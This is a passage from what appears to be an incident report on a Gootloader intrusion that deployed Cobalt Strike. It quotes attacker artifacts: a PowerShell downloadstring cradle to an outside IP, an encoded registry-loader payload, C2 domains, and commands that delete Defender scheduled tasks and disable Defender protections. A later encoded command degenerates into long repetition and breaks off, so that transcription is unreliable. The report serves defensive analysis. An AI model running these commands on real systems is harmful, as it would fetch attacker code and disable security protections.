summarizes the Gootloader initial execution.\n\n```image\nAlt: Execution Summary\nDescription: The image is a flowchart illustrating the execution process of the Gootloader. It outlines the steps involved, starting from the initial execution of the malicious script (`wscript.exe olympus_plea_agreement 34603.js`), which contacts the command and control (C2) servers to retrieve the payload. It details how the Gootloader writes a .NET loader and an encoded Cobalt Strike payload to the registry, and how the PowerShell command is executed to load the .NET loader. The diagram also highlights how the .NET loader subsequently reads and decodes the Cobalt Strike payload from the registry for execution.\nTranscription: |\n  plaintext\n  https://junk-bros.com\n  https://jp.imonitorsoft.com\n  https://kakiosk.adsparkdev.com\n  \n  wscript.exe olympus_plea_agreement 34603.js\n      Gootloader contacts C2 and pulls down payload\n  \n  powershell.exe\n      .NET loader read from registry and loaded in Powershell via Assembly.Load() using an encoded Powershell command\n      The same encoded Powershell command is added as a scheduled task to run on user logon\n  \n  .NET loader and encoded Cobalt Strike payload written to registry\n      .NET Loader -> HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n      Cobalt Strike -> HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username\n  \n  .NET Loader\n      .NET loader is executed which reads and decodes a Cobalt Strike payload from the registry\n      .NET loader loads and executes the Cobalt Strike payload\n```\n\nAn excellent resource from Microsoft describes a set of configurations that can be applied to Windows that can stop `.js` files from executing, preventing this attack chain from ever getting off the ground.\n\nDuring later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.\n\n```\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))\"\n```\n\n## Persistence\n\nThe Javascript (Gootloader) file invoked an encoded PowerShell command.\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a log entry or data table showing details of a process creation event related to a PowerShell command. It includes columns for EventCode, TaskCategory, ParentImage, and CommandLine. The CommandLine specifies a PowerShell script execution through the Windows Script Host (wscript.exe), indicating the use of encoded commands. This image provides technical insight into the execution of potentially malicious PowerShell commands, relevant for understanding cyber threats.\nTranscription: |\n  plaintext\n  EventCode: 1\n  TaskCategory: Process Create (rule: ProcessCreate)\n  ParentImage: C:\\Windows\\System32\\wscript.exe\n  CommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/e\" N\"g\"A4\"ADc\"ANgA4\"ADEAMwA7ACQAYQ\"A9ACIA\"TgB\"n\"AEEAeAB\"B\"AE\"Q\"AUQ\"BBAE\"4ZwBBADA\"AQ\"QBEAGsAQQ\"BNAGc\"AQDBA4\"EEARABF\"AE\"E\"AT\"w\"B3A\"ETIAegBB\"AEc\"AdvBBA\"F\"oAUQBC\"AGwA\"Q\"Q\"B\"IAEEAQ\"\n```\n\nThe encoded PowerShell command creates a Scheduled Task that executes when the selected user logs on to the computer. An encoded PowerShell command is executed that will retrieve and execute the payload stored in the Registry.\n\n```\n6876813;\n$a=\"NgAxADQANgA0ADkAMgAxADEAOwBzAGwAZQBlAHAAIAAtAHMAIAA4ADMAOwAkAG8AcABqAD0ARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACgAIgBoAGsAIgArACIAYwB1ADoAXABzAG8AZgAiACsAIgB0AHcAIgArACIAYQByAGUAXABtAGkAYwAiACsAIgByAG8AcwAiACsAIgBvAGYAdABcAFAAaABvAG4AZQBcACIAKwBbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgAoACIAdQBzAGUAIgArACIAcgBuACIAKwAiAGEAbQBlACIAKQArACIAMAAiACkAOwBmAG8AcgAgACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAZQAgADcANgAwADsAJAB1AG8AKwArACkAewBUAHIAeQB7ACQAbQBwAGQAKwA9ACQAbwBwAGoALgAkAHUAbwB9AEMAYQB0AGMAaAB7AH0AfQA7ACQAdQBvAD0AMAA7AHcAaABpAGwAZQAoACQAdAByAHUAZQApAHsAJAB1AG8AKwArADsAJABrAG8APQBbAG0AYQB0AGgAXQA6ADoAKAAiAHMAcQAiACsAIgByAHQAIgApACgAJAB1AG8AKQA7AGkAZgAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewBiAHIAZQBhAGsAfQB9ACQAeQBsAD0AJABtAHAAZAAuAHIAZQBwAGwAYQBjAGUAKAAiACMAIgAsACQAawBvACkAOwAkAGsAagBiAD0AWwBiAHkAdABlAFsAXQBdADoAOgAoACIAbgBlACIAKwAiAHcAIgApACgAJAB5AGwALgBMAGUAbgBnAHQAaAAvADIAKQA7AGYAbwByACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAdAAgACQAeQBsAC4ATABlAG4AZwB0AGgAOwAkAHUAbwArAD0AMgApAHsAJABrAGoAYgBbACQAdQBvAC8AMgBdAD0AWwBjAG8AbgB2AGUAcgB0AF0AOgA6ACgAIgBUAG8AQgAiACsAIgB5AHQAZQAiACkAKAAkAHkAbAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJAB1AG8ALAAyACkALAAoADIAKgA4ACkAKQB9AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvACIAKwAiAGEAZAAiACkAKAAkAGsAagBiACkAOwBbAE8AcABlAG4AXQA6ADoAKAAiAFQAZQAiACsAIgBzAHQAIgApACgAKQA7ADYAMQAxADgAOQA4ADUANAA0ADsA\";\n```\n\nThe task created from the PowerShell script:\n\n```image\nAlt: Scheduled Task\nDescription: The image displays an XML representation of a scheduled task created by a PowerShell script. The task is set to trigger when a specific user logs on. Key elements include the task's registration information, triggers, settings, actions, and user principal details. The XML schema indicates various properties such as logon type, execution parameters, and security context, which are relevant to the execution of the PowerShell command.\nTranscription: |\n  xml\n  <?xml version=\"1.0\" encoding=\"UTF-16\"?>\n  <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n    <RegistrationInfo>\n      <URI>\\</URI>\n    </RegistrationInfo>\n    <Triggers>\n      <LogonTrigger>\n        <Enabled>true</Enabled>\n        <UserId></UserId>\n      </LogonTrigger>\n    </Triggers>\n    <Settings>\n      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n      <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n      <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n      <AllowHardTerminate>true</AllowHardTerminate>\n      <StartWhenAvailable>false</StartWhenAvailable>\n      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n      <IdleSettings>\n        <Duration>PT10M</Duration>\n        <WaitTimeout>PT1H</WaitTimeout>\n        <StopOnIdleEnd>true</StopOnIdleEnd>\n        <RestartOnIdle>false</RestartOnIdle>\n      </IdleSettings>\n      <AllowStartOnDemand>true</AllowStartOnDemand>\n      <Enabled>true</Enabled>\n      <Hidden>false</Hidden>\n      <RunOnlyIfIdle>false</RunOnlyIfIdle>\n      <WakeToRun>false</WakeToRun>\n      <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n      <Priority>7</Priority>\n    </Settings>\n    <Actions Context=\"Author\">\n      <Exec>\n        <Command>C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</Command>\n        <Arguments>-w -n -e \n```\n\n## Defense Evasion\n\nWindows Defender scheduled scans were deleted from the system. This was observed on multiple servers the threat actor pivoted to.\n\n```image\nAlt: Windows Defender\nDescription: The image displays a textual output from a process creation log, detailing the execution of the 'schtasks.exe' command. This command was used to delete scheduled tasks related to Windows Defender, indicating a potential evasion of security measures. Key elements include the process ID, command line executed, user information, and hash values for verification. The context suggests this is part of a larger discussion on defense evasion tactics employed by threat actors.\nTranscription: |\n  plaintext\n  \"Process Create:\n  RuleName: technique_id=T1086,technique_name=PowerShell\n  UtcTime:\n  ProcessGuid: {c26db5f6-5adc-61f9-f631-000000000060}\n  ProcessId:  3688\n  Image: C:\\Windows\\System32\\schtasks.exe\n  FileVersion:\n  Description: Task Scheduler Configuration Tool\n  Product: Microsoft Windows Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: schtasks.exe\n  CommandLine: \"C:\\Windows\\system32\\schtasks.exe\" /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\n  CurrentDirectory: C:\\Users\\\n  User:\n  LogonGuid: {c26db5f6-901c-61a3-bdad-030000000000}\n  LogonId: 0x3ABD8\n  TerminalSessionId: 1\n  IntegrityLevel: High\n  Hashes: SHA1=EF173058B6BD8AB7E07C1A56B63A9E504E463D2DA,MD5=8AC868920214321438EABFBDE93BC2,SHA256=1AC5741B075111E49CB1681BD3A00EEF9B03F\n  ParentProcessGuid: {c26db5f6-5aa1-61f9-e731-000000000060}\n  ParentProcessId: 9724\n  ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  ParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"\n```\n\n```\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\n```\n\nFurthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.\n\n```\nSet-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableArchiveScanning $true\nSet-MpPreference -DisableBehaviorMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nSet-MpPreference -DisableIntrusionPreventionSystem $true\nSet-MpPreference -DisableScanningNetworkFiles $true\nSet-MpPreference -MAPSReporting 0\nSet-MpPreference -DisableCatchupFullScan $True\nSet-MpPreference -DisableCatchupQuickScan $True\n```\n\nAs in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.\n\n```image\nAlt: Memory Dump\nDescription: The image displays a table containing three rows and three columns. The columns are labeled 'Action Type', 'Initiating Process File Name', and 'Initiating Process Command Line'. Each row corresponds to actions involving the process 'rundll32.exe', detailing the type of action (such as 'RemoteSetThreadContextMemoryExecution' and 'RemoteExecutable MemoryAllocation') performed by or related to this process. This data is relevant to understanding the behavior of the threat actor's tools during a cyber intrusion.\nTranscription: |\n  Action Type                                      Initiating Process File Name    Initiating Process Command Line\n  RemoteSetThreadContextMemoryExecution            rundll32.exe                    rundll32.exe\n  RemoteExecutableMemoryAllocation                 rundll32.exe                    rundll32.exe\n  RemoteExecutableMemoryAllocation                 rundll32.exe                    rundll32.exe\n```\n\nThis can be observed in the memory dump from the beachhead host with the tell-tale `PAGE_EXECUTE_READWRITE` protection settings on the memory space and MZ headers observable in the process memory space.\n\n```image\nAlt: Memory Dump\nDescription: The image is a screenshot of a memory dump, showing hexadecimal machine code and memory addresses related to the execution of `rundll32.exe`. Key elements include indications of `PAGE_EXECUTE_READWRITE` memory protection settings and `MZ` headers, which are characteristic of executable files. The layout consists of lines of code displaying function calls and memory operations, with specific highlights on the memory protection status and executable identifiers.\nTranscription: |\n  08 4a 40 d1 c7 7e 7f 00 00  J...@..~...\n  3420    rundll32.exe          0x3030000    0x3063fff    VadS    PAGE_EXECUTE_READWRITE    52    1    Disabled\n  ...\n  50 52 55 56 57 8b ec 83 ec 0c  MZRE.\n  c3 5a 52 5e 68 00 00 00 00 68  .Z^h....h\n  c3 5a 5f 5d 0f 45 68 00 00 00  .Z_]..Eh...\n  ...\n  0x3030002:    dec    ebp\n  0x3030003:    pop    ecx\n  0x3030004:    push   ebp\n  0x3030005:    inc    ebp\n  0x3030006:    push   0x303009\n  0x303000b:    pop    ebx\n  0x303000c:    add    ebx, ebx\n  0x303000e:    mov    esp, esp\n  0x3030010:    mov    ebp, esp\n  0x3030012:    push   0x7d445\n  0x3030017:    call   0x56a2b5f0\n  ...\n  0x3030021:    push   edi\n  0x3030022:    call   eax\n  0x3030024:    add    byte ptr [eax], al\n  0x3030026:    add    byte ptr [eax], al\n  0x3030028:    add    byte ptr [eax], al\n  0x303002a:    add    byte ptr [eax], al\n  0x303002c:    add    byte ptr [eax], al\n  0x303002e:    add    byte ptr [eax], al\n  0x3030030:    add    byte ptr [eax], al\n  0x3030032:    add    byte ptr [eax], al\n  0x3030034:    add    byte ptr [eax], al\n  0x3030036:    add    byte ptr [eax], al\n  0x3030038:    add    byte ptr [eax], al\n  3420    rundll32.exe          0x3260000    0x329dfff    VadS    PAGE_EXECUTE_READWRITE    62    1    Disabled\n  ...\n  50 52 55 56 57 8b ec 83 ec 0c  MZRE.\n  c3 5a 52 5e 68 00 00 00 00 68  .Z^h....h\n  c3 5a 5f 5d 0f 45 68 00 00 00  .Z_]..Eh...\n  ...\n  0x3260001:    pop    edx\n  0x3260002:    dec    ebp\n  0x3260003:    pop    ecx\n  0x3260004:    push   ebp\n  0x3260005:    inc    ebp\n  0x3260006:    push   0x3260009\n  0x326000b:    pop    ebx\n  0x326000c:    add    ebx, ebx\n  0x326000e:    mov    esp, esp\n  0x3260010:    mov    ebp, esp\n  0x3260012:    push   0x7d445\n  0x3260017:    call   0x56a2b5f0\n  ...\n  0x3260021:    push   edi\n  0x3260022:    call   eax\n  0x3260024:    add    byte ptr [eax], al\n  0x3260026:    add    byte ptr [eax], al\n  0x3260028:    add    byte ptr [eax], al\n  0x326002a:    add    byte ptr [eax], al\n  0x326002c:    add    byte ptr [eax], al\n  0x326002e:    add    byte ptr [eax], al\n  0x3260030:    add    byte ptr [eax], al\n  0x3260032:    add    byte ptr [eax], al\n  0x3260034:    add    byte ptr [eax], al\n  0x3260036:    add    byte ptr [eax], al\n  0x3260038:    add    byte ptr [eax], al\n  7132    rundll32.exe          0xa700000    0xa90fff    VadS    PAGE_EXECUTE_READWRITE    33    1    Disabled\n  ...\n  4d 5a 90 00 03 00 00 00 04 00  MZARUH.\n  bd 1f 4c ef 20 00 00 00 00 00  ..L. ....\n  ...\n  a8 81 c1 f2 00 00 00 00 00 00  ..........\n  ...\n  03 5a 6f f1 01 48 00 00 00 00  .Zo..H....\n  ...\n  5a ff d3 00 00 00 00 00 00 00  Z.........\n  0xa700000:    pop    r10\n```\n\nDuring the intrusion, we observed various named pipes utilized by the threat actor’s Cobalt Strike beacons including default Cobalt Strike named pipes.\n\n```\nPipeName: \\msagent_ld\nPipeName: \\1ea887\n```\n\nThe threat actors were observed making use of double encoded Powershell commands. The first layer of encoding contains Hexadecimal and XOR encoding.\n\n```image\nAlt: Encoded Powershell\nDescription: The image displays a detailed output from a PowerShell process creation event. It includes various technical attributes such as the Process GUID, Process ID, image path, file version, description, and command line used. The command line contains obfuscated code involving hexadecimal values, indicating potential malicious intent. Additionally, it lists user information, terminal session ID, integrity level, and hash values related to the process, showcasing the technical details of the executed PowerShell command.\nTranscription: |\n  plaintext\n  \"Process Create:\n  RuleName: technique_id=T1086,technique_name=PowerShell\n  UtcTime: \n  ProcessGuid: {bb28eb5f-a41e-61f9-8445-000000000508}\n  ProcessId: 6268\n  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  FileVersion: \n  Description: Windows PowerShell\n  Product: Microsoft Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: PowerShell.EXE\n  CommandLine: powershell -nop -non -ep bypass -w h -c \"&([scriptblock]::Create(([0x34,0x73,0x2d,0x5e,0x75,0x67,0x3d,0x5f,0x72,0x7a,0x75,0x6d,0x64,0x30,0x53,0x7f,0x7d,0x7c,0x3e,0x43,0x75,0x62,0x66,0x75,0x6f,0x2c,0x8d,0x7c,0x58,0x64,0x64,0x6e,0x75,0x6e,0x38,0x37,0x55,0x44,0x3c,0x37,0x8c,0x37,0x68,0x74,0x68,0x6e,0x43,0x75,0x6f,0x75,0x6d,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0